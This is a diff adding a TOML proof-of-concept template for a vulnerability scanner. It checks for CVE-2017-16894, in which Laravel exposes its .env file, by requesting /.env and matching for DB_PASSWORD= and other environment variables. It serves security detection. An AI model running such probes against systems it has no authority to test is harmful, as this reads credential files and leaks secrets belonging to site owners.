@@ -1,0 +1,46 @@
+[info]
+author = "ave"
+description = "Laravel 框架 5.5.21 及之前版本中 .env 配置文件可被直接通过 Web 访问下载，导致数据库密码、应用密钥等敏感信息泄露。通过 GET 请求 /.env 路径并检测响应中是否包含 APP_NAME=、APP_DEBUG=、DB_PASSWORD= 等典型环境变量内容来判断漏洞是否存在。"
+id = "POC-AVE-2017-0056"
+name = "Laravel .env 配置文件泄露 PoC"
+severity = "high"
+tags = [
+    "cve-2017-16894",
+    "laravel",
+    "env",
+    "information-disclosure",
+]
+vuln_id = [
+    "CVE-2017-16894",
+    "AVE-2017-0056",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/.env"
+protocol = "http"
+
+[[poc.requests.matchers]]
+condition = "and"
+expect = true
+part = "body"
+type = "word"
+words = [
+    "APP_NAME=",
+    "APP_DEBUG=",
+    "DB_PASSWORD=",
+]
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["application/octet-stream"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
